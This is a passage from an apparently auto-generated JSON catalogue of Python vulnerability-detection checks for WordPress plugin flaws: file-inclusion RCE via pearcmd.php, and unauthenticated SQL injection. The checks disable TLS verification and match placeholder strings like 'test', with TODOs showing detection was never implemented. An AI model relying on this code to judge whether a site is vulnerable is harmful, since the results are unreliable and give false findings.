file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"News & Blog Designer Pack < 3.4.2 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_blog_designer_pack_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: blog-designer-pack-rce\nName: News & Blog Designer Pack < 3.4.2 - Remote Code Execution\nSeverity: critical\nDescription: News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.php. The vulnerability occurs within bdp_get_more_post function inside file bdp-ajax-functions.php.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_blog_designer_pack_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"blog-designer-pack-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"News & Blog Designer Pack < 3.4.2 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_1, \"\\\\\"success\\\\\":0\"); contains(body_2,\"channel pear.php.net\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"News & Blog Designer Pack < 3.4.2 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_blog_designer_pack_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wordpress",
          "wp-plugin",
          "lfi",
          "wp",
          "blogdesignerpack",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_contus_video_gallery_sqli",
        "name": "WordPress Video Gallery <= 2.8 - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'c8c605999f3d8352d7bb792cf3fdb25b' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "num",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num",
            "default": "999999999"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: contus-video-gallery-sqli\nName: WordPress Video Gallery <= 2.8 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_contus_video_gallery_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"contus-video-gallery-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Video Gallery <= 2.8 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'c8c605999f3d8352d7bb792cf3fdb25b' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['c8c605999f3d8352d7bb792cf3fdb25b', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Video Gallery <= 2.8 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_contus_video_gallery_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: contus-video-gallery-sqli\nName: WordPress Video Gallery <= 2.8 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_contus_video_gallery_sqli:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"contus-video-gallery-sqli\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Video Gallery <= 2.8 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'c8c605999f3d8352d7bb792cf3fdb25b' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['c8c605999f3d8352d7bb792cf3fdb25b', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Video Gallery <= 2.8 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_contus_video_gallery_sqli(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sqli",
          "wpscan",
          "wordpress",
          "contus-video-gallery",
          "unauth",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_leaguemanager_sql_injection",
        "name": "LeagueManager <= 3.9.11 - SQL Injection",
        "language": "Python",
        "famille": "WebApp",
        "description": "The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: leaguemanager-sql-injection\nName: LeagueManager <= 3.9.11 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_leaguemanager_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"leaguemanager-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"LeagueManager <= 3.9.11 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"LeagueManager <= 3.9.11 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_leaguemanager_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: leaguemanager-sql-injection\nName: LeagueManager <= 3.9.11 - SQL Injection\nSeverity: critical\nDescription: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_leaguemanager_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"leaguemanager-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"LeagueManager <= 3.9.11 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"LeagueManager <= 3.9.11 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_leaguemanager_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "wpscan",
          "sqli",
          "wp",
          "wp-plugin",
          "wordpress",
          "leaguemanager",
          "unauth",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wp_autosuggest_sql_injection",
        "name": "WP AutoSuggest 0.24 - SQL Injection",
